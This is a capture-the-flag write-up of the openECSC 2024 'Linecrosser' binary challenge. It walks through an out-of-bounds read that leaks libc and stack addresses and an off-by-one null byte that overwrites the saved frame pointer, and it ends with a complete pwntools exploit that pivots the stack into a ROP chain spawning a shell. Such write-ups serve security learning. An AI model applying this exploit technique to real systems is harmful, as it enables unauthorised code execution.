# Overview
Welcome to the thrilling tale of how a *seemingly insignificant* oversight led me on a wild ride through the world of stack pivoting with mathematical precision.

**Challenge:** [Linecrosser](https://open.ecsc2024.it/challenges#challenge-9) (openECSC 2024 round 1) 
**Attack Type:** Ret-to-libc, achieved by stack pivoting.
# Introduction
This challenge presents a modified "cards against hackers" game. The binary allocates two stack-based arrays in the main function and offers a four-option menu within its _main_loop_ function:

1. Play
2. Create custom card
3. Show custom card
4. Exit the game

Options 2 and 3 are relevant to the exploitation; let's examine their functionality.
# Data Leakage
The "Show custom card" option enables the user to view stored custom answers and prompts. After selecting answers (1) or prompts (2), the user provides an index number (an integer) that directly accesses the corresponding array, allocated in the main function, *without bounds checking*. 

The implementation differs for the answers and prompts arrays:

- **Answers:** This array consists of `char*` elements. Leaking meaningful data is difficult here, as we would need a valid pointer to a memory region containing useful data.
- **Prompts:** Each even-numbered element (`n`) is a `char*` (the prompt), while the subsequent odd-numbered element (`n+1`) is an `unsigned long long` (completion count). This structure simplifies data leakage; we can use any index containing a valid pointer (`n`) followed by the data we wish to exfiltrate (`n+1`).

By strategically indexing the prompts array, we can leak crucial information:

- **Index 42:** Provides a pointer to `libc_start_main`.
- **Index -3:** Leaks a stack address.
# Vulnerability
The "create custom card" function contains a buffer overflow vulnerability. When creating a custom prompt, the fgets function allows the user to input up to 1025 bytes into a 1000-byte buffer. This overflow can be exploited to overwrite the least significant byte of the saved frame pointer on the stack.

- **fgets behavior:** The `fgets` function reads a maximum of `n-1` bytes (where `n` is the buffer size) and appends a null terminator. In this case, with an input of 1024 bytes, the null terminator overwrites the least significant byte of the saved frame pointer.
- **Frame pointer Significance:** the saved frame pointer stores the base pointer for the previous function's stack frame. In this instance, the vulnerability directly impacts the stack frame of the `main_loop` function. 
# Exploitation

## The Strategy

With the information we’ve gathered, our exploitation strategy is as follows:

1. **Leak the libc base address:** By exploiting the `create custom card` function.
   We can get the libc the binary is using from the docker container.
3. **Call the `Create custom card` function:** Next, we call the Create custom card function. This is where we will insert our payload to execute a shell.
4. **Exploit the fgets behavior:** We exploit the behavior of the fgets function to overwrite the last byte of the saved frame pointer. We do this by inputting 1024 bytes, causing the null terminator to overwrite the least significant byte of the saved frame pointer.
5. **Return to `main_loop`:** Once the saved frame pointer has been overwritten, the function will return to `main_loop`. However, because the saved frame pointer has been changed, the stack frame of `main_loop` will be corrupted.
6. **Execute our ROP chain:** With the stack frame of `main_loop` broken, we want this function to return as soon as possible and execute our ROP chain. This will allow us to gain control over the program and execute our payload.
## The Execution

There are two main challenges we need to tackle to execute our plan:

1. **Randomness**: overwriting the last byte of the saved frame pointer will result in the stack frame of the main function shifting by a different offset each program execution. The corrupted frame pointer will always point inside our buffer, but we don’t know exactly where. 
   This is generally not a significant issue since we can fill our buffer with `ret` instructions and place the payload to execute a shell at the end of it. As long as the execution starts inside one of the `ret` instructions, our payload will be executed for sure.
2. **Returning from the `main_loop` function:** This function returns in two cases: when the player has made 20 choices or if a specific variable on the stack is set to 0. 

The former would be the easiest to exploit, as we could play 19 times and then send the payload on the 20th turn. **However**, in the heat of the competition, I completely overlooked this and opted for the second, and *much more challenging*, option.

Why is the second option more challenging?

The variable that needs to be set to 0 is right before the frame pointer. This means that the `ret slide` strategy is not usable. We need to precisely craft our payload so that the ROP chain ends up right after where RBP will point to. This complicates things significantly since we need to leak not only a libc address but also a stack address and calculate what the saved frame pointer is, and what exactly we are overwriting.

# The code
```python
#!/usr/bin/env python3
from pwn import *
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
exe = ELF("./linecrosser_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

gdb_script = '''
'''
def conn():
    if args.LOCAL:
        r = process([exe.path], aslr = True)
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript = gdb_script, aslr = True)
    else:
        r = remote("linecrosser.challs.open.ecsc2024.it", 38002)
    return r

def c_card(io, data):
    io.sendline(b'2')
    io.sendline(b'2')
    io.sendline(data)
    io.sendline(b'69420')

def show(io,num):
    io.sendline(b'3')
    io.sendline(b'2')
    io.sendline(num)

def main():
    io = conn()

    #leak libc
    show(io, b'42')
    io.recvuntil(b"Prompt (")
    LIBC_LEAK = int(io.recvuntil(b" completions)").split(b' ')[0])
    libc.address = LIBC_LEAK -171584
    log.critical(f'LIBC: leak {hex(LIBC_LEAK)} | base: {hex(libc.address)}')

    #leak stack
    show(io, b'-3')
    io.recvuntil(b"Prompt (")
    STACK_LEAK = int(io.recvuntil(b" completions)").split(b' ')[0])
    RBP = STACK_LEAK - 272
    log.critical(f'Saved RBP: {hex(RBP)} | Stack leak: {hex(STACK_LEAK)}')
    
    #calculate stack frame offset
    hex_rbp = hex(RBP)
    rbp_off = hex_rbp[-2:]
    log.critical(f'rbp_offset: 0x{rbp_off}')
    rbp_off = int(rbp_off, 16) -56 
    #rbp offset tells us how much the RBP pointer will move upwords from the saved RBP

    #creating the rop chain
    rop = ROP(libc)
    BINSH = libc.search(b'/bin/sh').__next__()
    POP_RDI = rop.find_gadget(['pop rdi', 'ret']).address
    RET = rop.find_gadget(['ret']).address
    SYSTEM = libc.sym["system"]
    EXIT = libc.sym["exit"]

    chain = p64(RET)+ p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

    #padding the payload
    log.info(f'rop chain len: {hex(len(chain))}')
    payload =  chain.ljust(rbp_off, b'S')  
    payload = payload.rjust(0x400, b'\00')
    c_card(io, payload)
    io.interactive()

if __name__ == "__main__":
    main()

```